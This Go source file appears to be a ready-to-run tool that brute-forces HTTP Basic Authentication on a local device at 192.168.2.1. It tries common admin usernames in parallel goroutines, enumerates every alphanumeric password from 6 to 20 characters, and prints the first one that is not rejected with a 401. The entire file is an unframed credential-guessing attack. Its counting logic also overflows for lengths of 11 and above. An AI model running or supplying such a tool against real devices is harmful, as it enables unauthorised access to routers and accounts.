package main

import (
	"encoding/base64"
	"log"
	"math"
	"net/http"
	"net/url"
	"sync"
	"time"
)

const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func main() {
	minLength := 6
	maxLength := 20
	basicAuthUrl := "http://192.168.2.1"
	logins := []string{"admin", "administrator", "root", "user", "guest"}
	parse, _ := url.Parse(basicAuthUrl)

	waitGroup := sync.WaitGroup{}
	waitGroup.Add(len(logins))
	for _, l := range logins {
		go func(login string) {
			start := time.Now()
			req := &http.Request{
				Method: "GET",
				URL:    parse,
				Header: map[string][]string{
					"Authorization": []string{""},
				},
			}
			for length := minLength; length <= maxLength; length++ {
				numPossibilities := int(math.Pow(float64(len(alphabet)), float64(length)))

				for i := 0; i < numPossibilities; i++ {
					password := ""
					for j := 0; j < length; j++ {
						charIndex := (i / int(math.Pow(float64(len(alphabet)), float64(j)))) % len(alphabet)
						password += string(alphabet[charIndex])
					}

					req.Header["Authorization"][0] = "Basic " + basicAuth(login, password)

					do, err := http.DefaultClient.Do(req)
					if err != nil {
						continue
					}
					_ = do.Body.Close()
					if do.StatusCode != 401 {
						log.Fatalf(password)
					}
				}

			}
			log.Printf("login %s took %s", login, time.Since(start))
			waitGroup.Done()
		}(l)
	}

	waitGroup.Wait()
}

func basicAuth(username, password string) string {
	auth := username + ":" + password
	return base64.StdEncoding.EncodeToString([]byte(auth))
}
